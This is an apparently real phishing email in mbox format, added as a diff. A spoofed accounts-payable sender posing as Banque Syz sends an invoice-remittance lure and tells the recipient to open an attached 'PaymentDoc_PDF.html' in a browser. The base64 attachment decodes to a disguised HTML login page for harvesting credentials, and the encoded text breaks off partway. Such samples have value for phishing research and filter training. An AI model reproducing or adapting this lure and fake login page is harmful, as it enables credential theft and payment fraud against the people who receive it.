@@ -1,0 +1,450 @@
+From jose@monkey.org Thu Sep 26 18:33:40 2024 +0000
+Return-Path: hope@asiavel.com
+Delivered-To: jose@monkey.org
+X-FDA: 82607737800.16.A1CE7F9
+Received: from again.asiavel.com (again.asiavel.com [193.25.216.176])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 10BF612000C
+	for <jose@monkey.org>; Thu, 26 Sep 2024 18:33:38 +0000 (UTC)
+Authentication-Results: imf16.b.hostedemail.com;
+	dkim=pass header.d=asiavel.com header.s=dkim header.b=eicECZk1;
+	dmarc=pass (policy=none) header.from=asiavel.com;
+	spf=pass (imf16.b.hostedemail.com: domain of hope@asiavel.com designates 193.25.216.176 as permitted sender) smtp.mailfrom=hope@asiavel.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1727375504; a=rsa-sha256;
+	cv=none;
+	b=34wwgorlo7HhV+DfIQz1XsAvtaDYSU7d2fGbYWKwFIMwntR4w3Cv8YH0tlUtqfcWiZKolW
+	dJS2iQ053ALUPGFg1l9LVK+Q/JRnvUQc6bSvrLfFA2DJ3jt+7906mIr8zDz97p6oDVSH6H
+	JxDzk6XPEPMx447JKa9zIPAG6xMh87c=
+ARC-Authentication-Results: i=1;
+	imf16.b.hostedemail.com;
+	dkim=pass header.d=asiavel.com header.s=dkim header.b=eicECZk1;
+	dmarc=pass (policy=none) header.from=asiavel.com;
+	spf=pass (imf16.b.hostedemail.com: domain of hope@asiavel.com designates 193.25.216.176 as permitted sender) smtp.mailfrom=hope@asiavel.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1727375504;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=qHEi4zLdMHmsEvMqoEwtrHiQs/vK0dhWx+TU5agIPDw=;
+	b=4gqmBDHq0D3zM4vg6yY57Nkx8mYtrjMp6DZPonJK/ZF0XTXiBDjWXd2qNAWX21exFWF/0Y
+	vclLQy1Wp0F1qrvgafjs+YjFzO63aUleTcWf7HyaGSSGOyOfAR+nwTbsLyXCDeBVseebe2
+	6hfiTxsTsKpqVj3CSkE6NxY99TdnFsw=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=asiavel.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; i=hope@asiavel.com;
+ bh=E5wk4eqtKtqsETbC1KPnHs2Rxhs=;
+ b=eicECZk1yxcpE6fR3xDhHwlQdJMHXLLMvhp9TieGYMxk4BaTVick0Qx54VizmQabJLblDUxdORMd
+   R4tWU4uDewqowTK/3ahnF5ogHWAGKidYzEMiKl1glYnr+7G2LYC5jXhUHkqctRSCu3nlqMgu/fUB
+   /aCNJMoj4MS34Gf/Fo9G0oni2zUgrtEpnq1B2GhBqHGgZ6hS4lZp8EWhDyLrKaGGfGx4EAgiUids
+   100I0Paf8CyerqtagtEPpCYPGvlp/jjC9cj9SQeoS9PxEqGsMhTlt71LWncx579Om7ar2IxRAbZU
+   PxbPjkVgB+vQEI5C2saAQv3eYMB5sfVbldAJcQ==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=asiavel.com;
+ b=DTlrTosQTC2C1EvaduBw4Nv3RleBXyfWEopli0HMOHjVhLCC9DKh3pk79GVq3Ld73vmFk00OtA0f
+   ztV8WNv7YHuGSHhiP+kE+MqcUpNhEzyusc7sZWmTwLFFUUxWjToTWird+U09zRe1CV8s5vd5OEfe
+   h1a465T+lp6kHeCn7m29Q85hZQLggFXzEBA9pr8xZt387OuFShUMywY+SsLiRjH158t4bAWTrZEL
+   xY0/aZIKn0wg16NvB7+lFtYndBIK5VqkT8U83UP5AJ5WAT/In12Au8IL9Y/xIgbT9bMMhBMKkmdf
+   8yH3+5o3MBZSgVqLMmXbZeJT3Dqm454ZHezzBA==;
+From: "Accounts payable"<hope@asiavel.com>
+To: jose@monkey.org
+Subject: RE: invoice payment (Bank transfer copy).
+Date: 27 Sep 2024 01:33:35 +0700
+Message-ID: <20240927013335.DF39695D9662CB8F@asiavel.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_CD502D7F.7A43E58E"
+X-Rspamd-Queue-Id: 10BF612000C
+X-Rspam-User: 
+X-Rspamd-Server: rspam07
+X-Stat-Signature: hxjqxo4s31co3i4yac1hb351n415gskn
+X-Spam-Status: No, score=5.76
+X-HE-Tag: 1727375618-945020
+X-HE-Meta: U2FsdGVkX19a5j0TpedDn8aZEYBinRtOC2DVdvX9Scz2BEti9xrITXHfZpi2J0SBMBmb/Ab4iDeSPqaXHP3OWmS3Gvepd7WSyxAysawSt9bizUZmvKTDNSFVbOwJRbqviLPI6nOGbTDt4o41Efm4EgKeMppVV8pNEW/4TQwt4exiww9Zpm+0sijSJRh1WHCZqstO8Zm1PfNgTstZBXewaGhlv9KgnckygqEb1vE6UwiSKFyEB4OehNjZtrvujqKUxflairuDBbBnL0AFQF4W3SnprdQFicR+QQ9EQtLJ0fEbMDfphFFFqymUZ5fHyf8ogmcygXtsFq4Jyaxg6IAAxHoUludnTYQBot3p2oc2Ey9DGOr/aqmG9scd+i1p6SFQJdAGtFogsZeD4eROKGsu3zFTCe2QCEMgs6f/mVYqqVOGNSi6s4aNzWJORSzCGAPXiUawVjMuUhqmZrMkTDiZXSmbZkJCFrSOl/+Ko7OfWs7/BNu0I0QymNgqfhNOR/3nmCivNRTxHikAy8pxTBmgV3Pq0hx3f0lH7drJ9dcycRg+D09FqrHIYml+cG+oQhaeP9bJhzBX+JQvQz68tUUP4oAh5QdIbP3bRWZKchYwYM6Jv7EpXDc5ZtvO0SNaCcLAKdhwdrzmXr9nThzBLTIZon/cVODVAKmqTfmOTAXOZ7CD3yT0n1FvMHK/OM4I4GYXluQBsAXGhtSuHHEAESa5o9ht7iVEJIVczWcabWdaYXZRI1qorrh7VxOn8BCHZM/3qWZ1jOPhuqZEVRucKg7TL2bQmL85yPlYoMsOAxCkSEALQcoOd85B4FqgUPJb/iANLy3Qk33WOvyTaNIMhLKXv6gWfvY1z+SidaKMYxENfsKtksZ2E5pDAEgqcQYLdK/L436x3LQphkSXpisVEPeOXLygX3/1pqgFLkH7IVd6rYqasJsoW7fhf0RJCbxj5U2KHKtzD053HCNxrBADPKZsF5E2cCQ
+ igIsK9Ej0QcZkS5TrPfjS1wXSggfLVjuJtNmTaJyE3WhbK5orm3JyixjQfkYTGZdtgMvA0YE/ngcAP2/Lxvx6tnYHgsPnfULceZxpbiPauSAo6CGFaSubXRy/u9UGSfBWjf4ot+7XMSPIOT7hGnzzOeSA6+8SfGUPtD1daoYMgN9xFg2uFhXBVYyOdv0rElbkVrFMORrlYiqw8Se/HAfmnJVvnrWWC7e10TaJAejIT4hRlqDws0k9fRsyGfmL/MfgGwxGaPYetcKWNBYfWA3NeXCK8914+1d4Z4PJDf3Pt2Cgu/0iIeA/OSH+kGu47hodrXcN
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 273
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_CD502D7F.7A43E58E
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; le=
+tter-spacing: normal; font-family: "Segoe UI Web (West European)", "Segoe U=
+I", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif=
+; font-size: medium; font-style: normal; font-weight: 400; margin-right: 0p=
+x; margin-left: 0px; word-spacing: 0px; white-space: normal; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;'>
+<span style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: rgb(32, 41, 69); line-height: inherit; font-family: "Nu=
+nito Sans"; font-size: 10.5pt; font-style: inherit; font-variant: inherit; =
+font-weight: inherit; vertical-align: baseline; font-stretch: inherit; font=
+-feature-settings: inherit; font-optical-sizing: inherit; font-kerning: inh=
+erit; font-variation-settings: inherit;'>Dear jose,</span></p>
+<div style=3D'margin: 1em 0px; padding: 0px; border: 0px currentColor; bord=
+er-image: none; color: rgb(32, 41, 69); text-transform: none; line-height: =
+inherit; text-indent: 0px; letter-spacing: normal; font-family: "Nunito San=
+s"; font-size: 10.5pt; font-style: normal; font-weight: 400; word-spacing: =
+0px; vertical-align: baseline; white-space: normal; orphans: 2; widows: 2; =
+font-stretch: inherit; font-feature-settings: inherit; font-variant-ligatur=
+es: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial; font-optical-sizin=
+g: inherit; font-kerning: inherit; font-variation-settings: inherit; font-v=
+ariant-numeric: inherit; font-variant-east-asian: inherit; font-variant-alt=
+ernates: inherit; font-variant-position: inherit;'>As per client's instruct=
+ion, Please&nbsp;find attached remittance for invoice payment&nbsp;</div>
+<div style=3D'margin: 1em 0px; padding: 0px; border: 0px currentColor; bord=
+er-image: none; color: rgb(32, 41, 69); text-transform: none; line-height: =
+inherit; text-indent: 0px; letter-spacing: normal; font-family: "Nunito San=
+s"; font-size: 10.5pt; font-style: normal; font-weight: 400; word-spacing: =
+0px; vertical-align: baseline; white-space: normal; orphans: 2; widows: 2; =
+font-stretch: inherit; font-feature-settings: inherit; font-variant-ligatur=
+es: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial; font-optical-sizin=
+g: inherit; font-kerning: inherit; font-variation-settings: inherit; font-v=
+ariant-numeric: inherit; font-variant-east-asian: inherit; font-variant-alt=
+ernates: inherit; font-variant-position: inherit;'>and kindly update your r=
+ecords.<br><br>Kindly confirm receipt.<br><br>
+Thank you<br style=3D"text-align: left; color: rgb(44, 54, 58); text-transf=
+orm: none; text-indent: 0px; letter-spacing: normal; font-family: monospace=
+; font-size: 13px; font-style: normal; font-weight: 400; word-spacing: 0px;=
+ white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgr=
+ound-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varian=
+t-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
+initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><strong>
+</strong><span lang=3D"EN-US" style=3D'color: rgb(32, 41, 69); font-family:=
+ "Nunito Sans"; font-size: 10.5pt;'><br class=3D"Apple-interchange-newline"=
+>Cordialement,<u></u><u></u></span></div>
+<p class=3D"MsoNormal" style=3D"margin: 0px; color: rgb(34, 34, 34); text-t=
+ransform: none; text-indent: 0px; letter-spacing: normal; font-family: Aria=
+l, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight=
+: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><span lang=3D"EN-US" style=3D'color: rgb(3=
+2, 41, 69); font-family: "Nunito Sans"; font-size: 10.5pt;'>Claudio<u></u><=
+u></u></span></p>
+<p class=3D"MsoNormal" style=3D"margin: 0px; color: rgb(34, 34, 34); text-t=
+ransform: none; text-indent: 0px; letter-spacing: normal; font-family: Aria=
+l, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight=
+: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><span style=3D'color: rgb(32, 41, 69); fon=
+t-family: "Nunito Sans"; font-size: 10.5pt;'><u></u>&nbsp;<u></u></span></p=
+>
+<table style=3D"color: rgb(34, 34, 34); text-transform: none; letter-spacin=
+g: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; fon=
+t-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; =
+border-collapse: collapse; orphans: 2; widows: 2; background-color: rgb(255=
+, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -we=
+bkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decor=
+ation-style: initial; text-decoration-color:=20
+initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr style=
+=3D"height: 13.7pt;"><td width=3D"215" valign=3D"top" style=3D"margin: 0px;=
+ padding: 0cm 5.4pt; width: 161.4pt; height: 13.7pt;" colspan=3D"2"><p clas=
+s=3D"MsoNormal" style=3D"margin: 0px;"><b><span lang=3D"EN-US" style=3D'col=
+or: rgb(255, 107, 15); letter-spacing: -0.1pt; font-family: "Nunito Sans";'=
+>Claudio Usellini</span></b><b>
+<span lang=3D"EN-US" style=3D'color: rgb(255, 107, 15); letter-spacing: -0.=
+1pt; font-family: "Nunito Sans"; font-size: 10pt;'><u></u><u></u></span></b=
+></p></td><td width=3D"19" valign=3D"top" style=3D"margin: 0px; padding: 0c=
+m 5.4pt; width: 14.25pt; height: 13.7pt;"><p class=3D"MsoNormal" style=3D"m=
+argin: 0px;"><b><span lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); lett=
+er-spacing: -0.1pt; font-family: "Nunito Sans"; font-size: 10.5pt;'><u></u>=
+&nbsp;<u></u></span></b></p></td>
+<td width=3D"206" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; =
+width: 154.8pt; height: 13.7pt;"><p class=3D"MsoNormal" style=3D"margin: 0p=
+x;"><b><span lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); letter-spacin=
+g: -0.1pt; font-family: "Nunito Sans";'><u></u>&nbsp;<u></u></span></b></p>=
+</td></tr><tr style=3D"height: 5.65pt;"><td width=3D"215" valign=3D"top" st=
+yle=3D"margin: 0px; padding: 0cm 5.4pt; width: 161.4pt; height: 5.65pt;" co=
+lspan=3D"2"><p class=3D"MsoNormal" style=3D"margin: 0px;">
+<span lang=3D"EN-US" style=3D'color: rgb(255, 107, 15); letter-spacing: -0.=
+1pt; font-family: "Nunito Sans"; font-size: 8pt;'>Assistant Relationship Ma=
+nager SIM<u></u><u></u></span></p></td><td width=3D"19" valign=3D"top" styl=
+e=3D"margin: 0px; padding: 0cm 5.4pt; width: 14.25pt; height: 5.65pt;"><p c=
+lass=3D"MsoNormal" style=3D"margin: 0px;"><b><span lang=3D"EN-US" style=3D'=
+color: rgb(0, 206, 176); letter-spacing: -0.1pt; font-family: "Nunito Sans"=
+; font-size: 10pt;'><u></u>&nbsp;<u></u></span></b></p></td>
+<td width=3D"206" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; =
+width: 154.8pt; height: 5.65pt;"><p class=3D"MsoNormal" style=3D"margin: 0p=
+x;"><b><span lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); letter-spacin=
+g: -0.1pt; font-family: "Nunito Sans"; font-size: 10.5pt;'><u></u>&nbsp;<u>=
+</u></span></b></p></td></tr><tr style=3D"height: 11.35pt;"><td width=3D"26=
+" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; width: 19.5pt; h=
+eight: 11.35pt;"><p class=3D"MsoNormal" style=3D"margin: 0px;">
+<span lang=3D"EN-US" style=3D'color: rgb(32, 41, 69); font-family: "Nunito =
+Sans"; font-size: 8pt;'>D.<u></u><u></u></span></p><p class=3D"MsoNormal" s=
+tyle=3D"margin: 0px;"><span lang=3D"EN-US" style=3D'color: rgb(32, 41, 69);=
+ font-family: "Nunito Sans"; font-size: 8pt;'>E.</span><b><span style=3D'co=
+lor: rgb(32, 41, 69); letter-spacing: -0.1pt; font-family: "Nunito Sans"; f=
+ont-size: 10pt;'><u></u><u></u></span></b></p></td>
+<td width=3D"189" valign=3D"top" style=3D"border-width: medium 1.5pt medium=
+ medium; border-style: none solid none none; border-color: currentColor rgb=
+(255, 107, 15) currentColor currentColor; margin: 0px; padding: 0cm 5.4pt; =
+width: 141.9pt; height: 11.35pt;"><p class=3D"MsoNormal" style=3D"margin: 0=
+px;"><span lang=3D"EN-US" style=3D'color: rgb(32, 41, 69); font-family: "Nu=
+nito Sans"; font-size: 8pt;'>+41 58 799 81 10</span></p><p class=3D"MsoNorm=
+al" style=3D"margin: 0px;">
+<span lang=3D"EN-US" style=3D'color: rgb(32, 41, 69); font-family: "Nunito =
+Sans";'><a style=3D"color: rgb(17, 85, 204);" href=3D"mailto:colin.gervaix@=
+syzgroup.com" target=3D"_blank"><span style=3D"font-size: 8pt;">claudio.use=
+llini@syzgroup.com</span></a></span><span lang=3D"EN-US" style=3D'color: rg=
+b(32, 41, 69); font-family: "Nunito Sans"; font-size: 8pt;'><u></u><u></u><=
+/span></p></td><td width=3D"19" valign=3D"top" style=3D"margin: 0px; paddin=
+g: 0cm 5.4pt; width: 14.25pt; height: 11.35pt;">
+<p class=3D"MsoNormal" style=3D"margin: 0px;"><b><span style=3D'color: rgb(=
+0, 206, 176); letter-spacing: -0.1pt; font-family: "Nunito Sans"; font-size=
+: 10pt;'><u></u>&nbsp;<u></u></span></b></p></td><td width=3D"206" valign=
+=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; width: 154.8pt; height: =
+11.35pt;"><p class=3D"MsoNormal" style=3D"margin: 0px;"><b><span lang=3D"FR=
+" style=3D'color: rgb(255, 107, 15); font-family: "Nunito Sans"; font-size:=
+ 8pt;'>Banque Syz SA</span></b>
+<span lang=3D"FR" style=3D'color: rgb(255, 107, 15); font-family: "Lucida S=
+ans", sans-serif; font-size: 8pt;'><u></u><u></u></span></p><p class=3D"Mso=
+Normal" style=3D"margin: 0px;"><span lang=3D"FR" style=3D'color: rgb(32, 41=
+, 69); letter-spacing: -0.1pt; font-family: "Nunito Sans"; font-size: 8pt;'=
+>Quai des Bergues 1, 1201 Geneva</span><span lang=3D"FR" style=3D'color: rg=
+b(32, 41, 69); letter-spacing: -0.1pt; font-family: "Nunito Sans"; font-siz=
+e: 8pt;'><u></u><u></u></span></p>
+<p class=3D"MsoNormal" style=3D"margin: 0px;"><span lang=3D"EN-US" style=3D=
+'color: rgb(32, 41, 69); font-family: "Nunito Sans";'><a style=3D"color: rg=
+b(17, 85, 204);" href=3D"http://www.syzgroup.com/" target=3D"_blank" data-s=
+aferedirecturl=3D"https://www.google.com/url?q=3Dhttp://www.syzgroup.com/&a=
+mp;source=3Dgmail&amp;ust=3D1727458318066000&amp;usg=3DAOvVaw3CJLuZrpw7SIDZ=
+H4Zt_9Il"><span lang=3D"FR" style=3D"color: rgb(32, 41, 69); font-size: 8pt=
+;">syzgroup.com</span></a></span>
+<span lang=3D"EN-US" style=3D'color: rgb(32, 41, 69); letter-spacing: -0.1p=
+t; font-family: "Nunito Sans"; font-size: 8pt;'><u></u><u></u></span></p></=
+td></tr><tr style=3D"height: 11.35pt;"><td width=3D"215" valign=3D"bottom" =
+style=3D"border-width: medium 1.5pt medium medium; border-style: none solid=
+ none none; border-color: currentColor rgb(255, 107, 15) currentColor curre=
+ntColor; margin: 0px; padding: 0cm 5.4pt; width: 161.4pt; height: 11.35pt;"=
+ rowspan=3D"4" colspan=3D"2">
+<p class=3D"MsoNormal" style=3D"margin: 0px;"><a style=3D"color: rgb(17, 85=
+, 204);" href=3D"https://www.syzgroup.com/en/independent-managers" target=
+=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://=
+www.syzgroup.com/en/independent-managers&amp;source=3Dgmail&amp;ust=3D17274=
+58318066000&amp;usg=3DAOvVaw2yL_ioVgci64cvOURP6Jye"><span lang=3D"EN-US" st=
+yle=3D'color: black; font-family: "Minion Pro"; font-size: 9pt; text-decora=
+tion: none;'></span></a><b>
+<span style=3D'color: rgb(0, 206, 176); letter-spacing: -0.1pt; font-family=
+: "Nunito Sans"; font-size: 10pt;'><u></u><u><br></u></span></b></p></td><t=
+d width=3D"19" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; wid=
+th: 14.25pt; height: 11.35pt;"><p class=3D"MsoNormal" style=3D"margin: 0px;=
+"><b><span lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); letter-spacing:=
+ -0.1pt; font-family: "Nunito Sans"; font-size: 10.5pt;'><u></u>&nbsp;<u></=
+u></span></b></p></td>
+<td width=3D"206" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; =
+width: 154.8pt; height: 11.35pt;"><p class=3D"MsoNormal" style=3D"margin: 0=
+px;"><b><span lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); letter-spaci=
+ng: -0.1pt; font-family: "Nunito Sans";'><u></u>&nbsp;<u></u></span></b></p=
+></td></tr><tr style=3D"height: 2.75pt;"><td width=3D"19" valign=3D"top" st=
+yle=3D"margin: 0px; padding: 0cm 5.4pt; width: 14.25pt; height: 2.75pt;"><p=
+ class=3D"MsoNormal" style=3D"margin: 0px;"><b>
+<span lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); letter-spacing: -0.1=
+pt; font-family: "Nunito Sans";'><u></u>&nbsp;<u></u></span></b></p></td><t=
+d width=3D"206" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; wi=
+dth: 154.8pt; height: 2.75pt;"></td></tr><tr style=3D"height: 2.75pt;"><td =
+width=3D"19" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; width=
+: 14.25pt; height: 2.75pt;"><p class=3D"MsoNormal" style=3D"margin: 0px;"><=
+b>
+<span lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); letter-spacing: -0.1=
+pt; font-family: "Nunito Sans"; font-size: 10.5pt;'><u></u>&nbsp;<u></u></s=
+pan></b></p></td><td width=3D"206" valign=3D"top" style=3D"margin: 0px; pad=
+ding: 0cm 5.4pt; width: 154.8pt; height: 2.75pt;"><p class=3D"MsoNormal" st=
+yle=3D"margin: 0px;"><span style=3D'color: rgb(32, 41, 69); font-family: "N=
+unito Sans";'></span><b><span lang=3D"EN-US" style=3D'color: rgb(0, 206, 17=
+6); letter-spacing: -0.1pt; font-family: "Nunito Sans";'><u></u><u>
+<br></u></span></b></p></td></tr><tr style=3D"height: 2.75pt;"><td width=3D=
+"19" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; width: 14.25p=
+t; height: 2.75pt;"><p class=3D"MsoNormal" style=3D"margin: 0px;"><b><span =
+lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); letter-spacing: -0.1pt; fo=
+nt-family: "Nunito Sans";'><u></u>&nbsp;<u></u></span></b></p></td><td widt=
+h=3D"206" valign=3D"top" style=3D"margin: 0px; padding: 0cm 5.4pt; width: 1=
+54.8pt; height: 2.75pt;"><p class=3D"MsoNormal" style=3D"margin: 0px;"><b>
+<span lang=3D"EN-US" style=3D'color: rgb(0, 206, 176); letter-spacing: -0.1=
+pt; font-family: "Nunito Sans";'><u></u>&nbsp;<u></u></span></b></p></td></=
+tr><tr height=3D"0"><td width=3D"26" style=3D"margin: 0px; border: currentC=
+olor; border-image: none;"></td><td width=3D"189" style=3D"margin: 0px; bor=
+der: currentColor; border-image: none;"></td><td width=3D"19" style=3D"marg=
+in: 0px; border: currentColor; border-image: none;"></td><td width=3D"206" =
+style=3D"margin: 0px; border: currentColor; border-image: none;"></td>
+</tr></tbody></table><p><br class=3D"Apple-interchange-newline">
+<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
+ne; text-indent: 0px; letter-spacing: normal; font-family: monospace; font-=
+size: 13px; font-style: normal; font-weight: 400; word-spacing: 0px; float:=
+ none; display: inline !important; white-space: normal; orphans: 2; widows:=
+ 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; f=
+ont-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-t=
+hickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><br><em><strong>sent via monkey.org downlo=
+ad or save document &amp; view with browser or Adobe PDF</strong></em></spa=
+n></p></body></html>
+------=_NextPart_000_0012_CD502D7F.7A43E58E
+Content-Type: text/html; name="PO_345178_PaymentDoc_PDF.html"; charset="utf-8"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PO_345178_PaymentDoc_PDF.html"
+
+PGh0bWw+PGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRl
+bnQ9IklFPWVkZ2UiPg0KPC9oZWFkPg0KPGJvZHk+DQogICAgPHN0eWxlPg0KICAgICAgICBi
+b2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiaHR0cHM6Ly9pLnNz
+dGF0aWMubmV0L3Z6YnVRLmpwZyIpOw0KICAgICAgICAgICAgYmFja2dyb3VuZC1zaXplOiBj
+b3ZlcjsNCiAgICAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogICAg
+ICAgICAgICBoZWlnaHQ6IDEwMHZoOw0KICAgICAgICAgICAgbWFyZ2luOiAwOw0KICAgICAg
+ICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2Vu
+dGVyOw0KICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgICAgfQ0KDQog
+ICAgICAgIC5sb2dpbi1mb3JtIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IHdoaXRlOw0K
+ICAgICAgICAgICAgcGFkZGluZzogMjBweDsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6
+IDEwcHg7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgMTBweCByZ2JhKDAsIDAsIDAs
+IDAuMSk7DQogICAgICAgIH0NCg0KICAgICAgICBpbnB1dCB7DQogICAgICAgICAgICB3aWR0
+aDogMTAwJTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7DQogICAgICAgICAgICBtYXJn
+aW46IDVweCAwOw0KICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2NjYzsNCiAgICAg
+ICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsNCiAgICAgICAgfQ0KDQogICAgICAgIGJ1dHRv
+biB7DQogICAgICAgICAgICB3aWR0aDogMTAwJTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEw
+cHg7DQogICAgICAgICAgICBtYXJnaW46IDEwcHggMDsNCiAgICAgICAgICAgIGJhY2tncm91
+bmQ6ICMwMDdiZmY7DQogICAgICAgICAgICBjb2xvcjogd2hpdGU7DQogICAgICAgICAgICBi
+b3JkZXI6IG5vbmU7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7DQogICAgICAg
+ICAgICBjdXJzb3I6IHBvaW50ZXI7DQogICAgICAgIH0NCiAgICA8L3N0eWxlPg0KPG1ldGEg
+aHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCg0KDQog
+PGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxzdHJvbmc+ICAgIDwvc3Ryb25nPjxkaXYgY2xh
+c3M9ImxvZ2luLWZvcm0iPjxzdHJvbmc+DQo8aW1nIHdpZHRoPSI1IiBoZWlnaHQ9IjUiIHN0
+eWxlPSJ3aWR0aDogMTUwcHg7IGhlaWdodDogMzJweDsiIHNyYz0iaHR0cHM6Ly9pLnBpbmlt
+Zy5jb20vNzM2eC8wOS84MS82YS8wOTgxNmFhMzk2MWViYzk4MjE4YTYwZjJmYjQ1MGNlZi5q
+cGciPjwvc3Ryb25nPjxoMT48c3BhbiBzdHlsZT0nZm9udC1mYW1pbHk6ICJDYWxpYnJpIExp
+Z2h0IjsnPg0KPHNwYW4gc3R5bGU9J2NvbG9yOiByZ2IoMjcsIDI3LCAyNyk7IHRleHQtdHJh
+bnNmb3JtOiBub25lOyB0ZXh0LWluZGVudDogMHB4OyBsZXR0ZXItc3BhY2luZzogbm9ybWFs
+OyBmb250LWZhbWlseTogIlNlZ29lIFVJIiwgLWFwcGxlLXN5c3RlbSwgIkhlbHZldGljYSBO
+ZXVlIiwgIkx1Y2lkYSBHcmFuZGUiLCBSb2JvdG8sIEVicmltYSwgIk5pcm1hbGEgVUkiLCBH
+YWR1Z2ksICJTZWdvZSBYYm94IFN5bWJvbCIsICJTZWdvZSBVSSBTeW1ib2wiLCAiTWVpcnlv
+IFVJIiwgIktobWVyIFVJIiwgVHVuZ2EsICJMYW8gVUkiLCBSYWF2aSwgIklza29vbGEgUG90
+YSIsIExhdGhhLCBMZWVsYXdhZGVlLCAiTWljcm9zb2Z0IFlhSGVpIFVJIiwgIk1pY3Jvc29m
+dCBKaGVuZ0hlaSBVSSIsICJNYWxndW4gR290aGljIiwgIkVzdHJhbmdlbG8gRWRlc3NhIiwg
+Ik1pY3Jvc29mdCBIaW1hbGF5YSIsICJNaWNyb3NvZnQgTmV3IFRhaSBMdWUiLCAiTWljcm9z
+b2Z0IFBoYWdzUGEiLCANCiJNaWNyb3NvZnQgVGFpIExlIiwgIk1pY3Jvc29mdCBZaSBCYWl0
+aSIsICJNb25nb2xpYW4gQmFpdGkiLCAiTVYgQm9saSIsICJNeWFubWFyIFRleHQiLCAiQ2Ft
